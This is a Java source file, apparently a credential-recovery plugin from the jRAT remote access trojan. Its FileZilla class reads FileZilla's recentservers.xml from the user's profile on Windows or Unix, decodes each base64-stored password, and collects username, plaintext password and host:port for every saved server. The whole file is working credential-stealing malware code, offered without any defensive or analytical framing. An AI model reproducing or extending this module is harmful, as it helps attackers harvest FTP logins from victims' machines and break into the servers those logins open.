package jrat.plugin.recovery.stub.programs;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

import jrat.plugin.recovery.stub.Utils;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

import sun.misc.BASE64Decoder;

import com.redpois0n.oslib.OperatingSystem;

public class FileZilla extends AbstractRecoverer {

	@Override
	public List<String[]> recover() throws Exception {
		List<String[]> list = new ArrayList<String[]>();

		File file = null;
		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
			file = new File(System.getenv("APPDATA") + "\\FileZilla\\recentservers.xml");
		} else {
			file = new File(System.getProperty("user.home") + "/.filezilla/recentservers.xml");
		}

		if (file != null && file.exists()) {
			DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
			DocumentBuilder db = dbf.newDocumentBuilder();
			Document doc = db.parse(file);
			doc.getDocumentElement().normalize();

			NodeList nList = doc.getElementsByTagName("Server");
			for (int temp = 0; temp < nList.getLength(); temp++) {
				Node n = nList.item(temp);
				if (n.getNodeType() == Node.ELEMENT_NODE) {
					Element e = (Element) n;

					String host = Utils.getTagValue("Host", e);
					String port = Utils.getTagValue("Port", e);
					String username = Utils.getTagValue("User", e);
					String password = Utils.getTagValue("Pass", e);
					
					try {
						password = new String(new BASE64Decoder().decodeBuffer(password));
					} catch (Exception ex) {
						ex.printStackTrace();
					}

					list.add(new String[] { username, password, host + ":" + port });
				}
			}
		}

		return list;
	}

	@Override
	public String getName() {
		return "FileZilla";
	}

}
